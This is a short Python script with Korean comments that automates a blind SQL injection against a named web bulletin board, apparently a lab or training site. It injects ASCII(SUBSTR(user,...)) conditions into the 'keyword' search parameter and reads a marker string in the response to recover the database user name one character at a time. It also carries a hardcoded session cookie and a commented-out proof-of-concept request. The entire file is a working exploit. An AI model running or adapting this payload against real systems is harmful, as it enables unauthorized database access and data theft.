import requests

url = 'http://elms1.skinfosec.co.kr:8082/community6/free'
# Cookie 값은 로그인 후 변경 필요
cookie = {'JSESSIONID': '94E9E298CF9FDB93CAA698312517C0FD'}

def find_target():

    find_value = ""

    for i in range(5):
        
        for ascii in range(48, 122):
            param = {"keyword": "aaa' AND ASCII(SUBSTR(user,{},1)) = {} AND '%1%'='%1".format(i+1, ascii), "startDt": "", "endDt": "", "searchType": "all"}
            print(param)
            Send = requests.post(url, params = param, cookies = cookie)
            print(Send.status_code)
            if "AAAAAAAAAAAAAAAAAAAAAAAAAAA" in Send.text:
                print("user의 값은: ",chr(ascii))
                find_value += chr(ascii)
                break
            print("값을 찾고있습니다!",chr(ascii))
    print("User의 이름은:", find_value, "입니다.")

find_target()
            
             
"""
# Blind SQL Injection 사전준비
param = {"keyword": "aaa' AND ASCII(SUBSTR(user,1,1)) = 73 AND '%1%'='%1", "startDt": "", "endDt": "", "searchType": "all"}

# POST방식으로 전송하므로 requests.post로 전달해야 한다.
Send = requests.post(url, params = param, cookies = cookie)
print(Send.status_code)
print(Send.text)

# Blind True, False Code
if "AAAAAAAAAAAAAAAAAAAAAAAAAAA" in Send.text:
    print(param['keyword'], "True")
else:
    print(param['keyword'], "False")
"""
        